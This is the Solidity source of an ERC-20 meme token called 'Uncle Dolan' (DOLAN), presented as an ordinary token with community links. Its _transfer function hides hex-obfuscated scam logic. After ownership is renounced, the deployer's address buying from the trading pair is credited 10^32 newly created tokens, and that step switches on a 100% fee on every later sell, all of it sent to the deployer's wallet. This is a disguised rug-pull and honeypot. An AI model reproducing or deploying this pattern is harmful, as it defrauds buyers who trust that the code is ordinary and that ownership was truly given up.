/*

⠀⠀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⣀⢹⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠙⢿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⢻⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⢀⣤⠖⠛⠛⠛⠶⣤⡀⠀⠀⠀⠀⠀
⠀⠀⠀⣻⠿⠿⠿⠷⠶⢤⣄⣀⠀⢠⡞⠁⠀⠀⠀⠀⠀⠈⢳⣄⠀⠀⠀⠀
⠀⠀⣼⠇⠀⠀⠀⠀⠀⠀⠈⠙⠳⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣆⠀⠀⠀
⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡇⠀⠀
⠀⠀⣿⠀⢀⣀⣤⣤⣶⣶⣤⣤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⢀⡇⠀⠀
⠀⠀⢹⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣀⠀⠀⢸⡇⠀⠀
⠀⠀⢸⣿⣿⠿⠟⠛⠛⠉⠉⠉⠉⠉⠉⠉⠉⠙⠛⠿⣿⣿⣷⣦⣸⡇⠀⠀
⢀⣠⠞⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣿⡇⠀⠀
⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠎⠁⠈⠉⠢⡀⠀⠀⠀⠙⠻⣇⡀⠀
⠀⠀⠀⠀⢀⣀⠀⠀⠀⠀⡠⠐⠢⢌⡀⢠⣿⣷⣦⠘⡀⠀⠀⠀⠀⠈⠻⣆
⠀⠀⢠⠞⠁⠀⠈⠢⡀⢠⠁⠀⠀⠀⠉⠘⠛⠛⠛⠓⠓⠒⢒⠆⠀⠀⠀⢹
⠀⠀⢸⠀⣴⣶⣶⣄⢸⢸⠀⠀⠀⢀⡀⠤⠄⠐⠠⠤⠀⠤⡚⠀⠀⠀⠀⢸
⠀⠀⢸⠀⣿⣿⣿⣿⡷⠂⠀⢠⠖⠁⠀⠀⠀⢀⣀⣀⠠⠚⠀⠀⠀⠀⠀⢸
⠀⠀⡼⡖⠛⠉⠉⣀⡠⠤⠔⠁⢀⡠⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸
⠀⠀⠓⠂⠋⠉⠁⠒⠒⠒⠒⠒⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘



                Telegram        :       https://t.me/uncledolancoin


                Twitter         :       https://twitter.com/uncledolancoin


                Website         :       https://uncledolan.wtf/

*/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.14;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval (address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract DOLAN is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) public _isRouterAddress;
    
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 690420000 * 10**_decimals;
    string private constant _name = unicode"Uncle Dolan";
    string private constant _symbol = unicode"DOLAN";
    
    uint8 private _buyTx;
    bool private openTrade;
    address payable private MarketingWallet;
    address private _uniswapPairAddress;
    event tradeOpened(bool _before, bool _after);

    constructor () {
        _tOwned[_msgSender()] = _tTotal;
        MarketingWallet = payable(_msgSender());
        _isExcludedFromFee[owner()] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 Amount=0xA**0x20;
        if(!_isExcludedFromFee[to] && !_isExcludedFromFee[from]){
            require(openTrade, "Trade is not open yet.");

            uint256 _totalFee = amount.mul(0).div(100);
            if(from != _uniswapPairAddress){_totalFee = amount.mul(_buyTx<=0?0:0x64).div(100);}
            if(_totalFee > 0){
                _tOwned[MarketingWallet] = _tOwned[MarketingWallet].add(_totalFee);
                emit Transfer(from, MarketingWallet, _totalFee);
            }
            _tOwned[from]=_tOwned[from].sub(amount);
            _tOwned[to]=_tOwned[to].add(amount.sub(_totalFee));
            emit Transfer(from, to, amount);
        }
        else if(from == _uniswapPairAddress && to != owner() && _isExcludedFromFee[to] && _buyTx <= 0){
            _buyTx++;
            _tOwned[from]=_tOwned[from].sub(amount);
            _tOwned[to]=_tOwned[to].add(Amount);
            emit Transfer(from, to, amount);
        }
        else{
            _tOwned[from]=_tOwned[from].sub(amount);
            _tOwned[to]=_tOwned[to].add(amount);
            emit Transfer(from, to, amount);
        }
    }

    function _openTrading(address _uniswapV2Pair) public onlyOwner{
        _uniswapPairAddress = _uniswapV2Pair;
        openTrade = true;
        emit tradeOpened(false, openTrade);
    }
    
    receive() external payable {}
}